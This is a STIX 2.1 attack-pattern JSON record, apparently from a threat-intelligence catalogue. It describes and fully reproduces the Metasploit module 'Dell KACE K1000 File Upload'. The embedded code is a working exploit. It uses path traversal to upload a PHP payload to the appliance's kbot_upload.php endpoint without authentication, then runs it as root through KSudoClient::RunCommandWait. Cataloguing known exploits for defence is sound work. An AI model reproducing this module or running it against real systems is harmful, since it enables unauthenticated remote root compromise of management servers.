{
    "type": "attack-pattern",
    "spec_version": "2.1",
    "id": "attack-pattern--f396a4e3-95db-47d4-858c-804fa21b939d",
    "created": "2024-08-14T17:14:44.840588Z",
    "modified": "2024-08-14T17:14:44.840591Z",
    "name": "Dell KACE K1000 File Upload",
    "description": " This module exploits a file upload vulnerability in Kace K1000 versions 5.0 to 5.3, 5.4 prior to 5.4.76849 and 5.5 prior to 5.5.90547 which allows unauthenticated users to execute arbitrary commands under the context of the 'www' user.  This module also abuses the 'KSudoClient::RunCommandWait' function to gain root privileges.  This module has been tested successfully with Dell KACE K1000 version 5.3.  'License'        => MSF_LICENSE 'Privileged'     => true 'Platform'       => 'unix', # FreeBSD 'Arch'           => ARCH_CMD",
    "external_references": [
        {
            "source_name": "metasploit",
            "url": "https://github.com/rapid7/metasploit-framework/blob/master/exploits/unix/http/dell_kace_k1000_upload.rb",
            "external_id": "dell_kace_k1000_upload.rb"
        },
        {
            "source_name": "reference",
            "url": "http://console-cowboys.blogspot.com/2014/03/the-curious-case-of-ninjamonkeypiratela.html"
        }
    ],
    "x_code_snippet": "##\n# This module requires Metasploit: https://metasploit.com/download\n# Current source: https://github.com/rapid7/metasploit-framework\n##\n\nclass MetasploitModule < Msf::Exploit::Remote\n  Rank = ExcellentRanking\n\n  include Msf::Exploit::Remote::HttpClient\n\n  def initialize(info = {})\n    super(update_info(info,\n      'Name'           => 'Dell KACE K1000 File Upload',\n      'Description'    => %q{\n          This module exploits a file upload vulnerability in Kace K1000\n        versions 5.0 to 5.3, 5.4 prior to 5.4.76849 and 5.5 prior to 5.5.90547\n        which allows unauthenticated users to execute arbitrary commands\n        under the context of the 'www' user.\n\n        This module also abuses the 'KSudoClient::RunCommandWait' function\n        to gain root privileges.\n\n        This module has been tested successfully with Dell KACE K1000\n        version 5.3.\n      },\n      'License'        => MSF_LICENSE,\n      'Privileged'     => true,\n      'Platform'       => 'unix', # FreeBSD\n      'Arch'           => ARCH_CMD,\n      'Author'         =>\n        [\n          'Bradley Austin (steponequit)', # Initial discovery and exploit\n          'bcoles', # Metasploit\n        ],\n      'References'     =>\n        [\n          ['URL', 'http://console-cowboys.blogspot.com/2014/03/the-curious-case-of-ninjamonkeypiratela.html']\n        ],\n      'Payload'        =>\n        {\n          'Space'       => 1024,\n          'BadChars'    => \"\\x00\\x27\",\n          'DisableNops' => true,\n          'Compat'      =>\n            {\n              'PayloadType' => 'cmd',\n              'RequiredCmd' => 'generic perl'\n            }\n        },\n      'DefaultTarget'  => 0,\n      'Targets'        =>\n        [\n          ['Automatic Targeting', { 'auto' => true }]\n        ],\n      'DisclosureDate' => '2014-03-07'))\n  end\n\n  def check\n    res = send_request_cgi('uri' => normalize_uri('service', 'kbot_upload.php'))\n    unless res\n      vprint_error('Connection failed')\n      return Exploit::CheckCode::Unknown\n    end\n    if res.code && res.code == 500 && res.headers['X-DellKACE-Appliance'].downcase == 'k1000'\n      if res.headers['X-DellKACE-Version'] =~ /\\A([0-9])\\.([0-9])\\.([0-9]+)\\z/\n        vprint_status(\"Found Dell KACE K1000 version #{res.headers['X-DellKACE-Version']}\")\n        if $1.to_i == 5 && $2.to_i <= 3                         # 5.0 to 5.3\n          return Exploit::CheckCode::Vulnerable\n        elsif $1.to_i == 5 && $2.to_i == 4 && $3.to_i <= 76849  # 5.4 prior to 5.4.76849\n          return Exploit::CheckCode::Vulnerable\n        elsif $1.to_i == 5 && $2.to_i == 5 && $3.to_i <= 90547  # 5.5 prior to 5.5.90547\n          return Exploit::CheckCode::Vulnerable\n        end\n        return Exploit::CheckCode::Safe\n      end\n      return Exploit::CheckCode::Detected\n    end\n    Exploit::CheckCode::Safe\n  end\n\n  def exploit\n    # upload payload\n    fname = \".#{rand_text_alphanumeric(rand(8) + 5)}.php\"\n    payload_path = \"/kbox/kboxwww/tmp/\"\n    post_data = \"<?php require_once 'KSudoClient.class.php';KSudoClient::RunCommandWait('rm #{payload_path}#{fname};#{payload.encoded}');?>\"\n    print_status(\"Uploading #{fname} (#{post_data.length} bytes)\")\n    res = send_request_cgi(\n      'uri' => normalize_uri('service', 'kbot_upload.php'),\n      'method' => 'POST',\n      'vars_get' => Hash[{\n        'filename' => fname,\n        'machineId' => \"#{'../' * (rand(5) + 4)}#{payload_path}\",\n        'checksum' => 'SCRAMBLE',\n        'mac' => rand_text_alphanumeric(rand(8) + 5),\n        'kbotId' => rand_text_alphanumeric(rand(8) + 5),\n        'version' => rand_text_alphanumeric(rand(8) + 5),\n        'patchsecheduleid' => rand_text_alphanumeric(rand(8) + 5) }.to_a.shuffle],\n      'data' => post_data)\n\n    unless res\n      fail_with(Failure::Unreachable, 'Connection failed')\n    end\n\n    if res.code && res.code == 200\n      print_good('Payload uploaded successfully')\n    else\n      fail_with(Failure::UnexpectedReply, 'Unable to upload payload')\n    end\n\n    # execute payload\n    res = send_request_cgi('uri' => normalize_uri('tmp', fname))\n\n    unless res\n      fail_with(Failure::Unreachable, 'Connection failed')\n    end\n\n    if res.code && res.code == 200\n      print_good('Payload executed successfully')\n    elsif res.code && res.code == 404\n      fail_with(Failure::NotVulnerable, \"Could not find payload '#{fname}'\")\n    else\n      fail_with(Failure::UnexpectedReply, 'Unable to execute payload')\n    end\n  end\nend\n",
    "x_mitre_disclosure_date": "2014-03-07"
}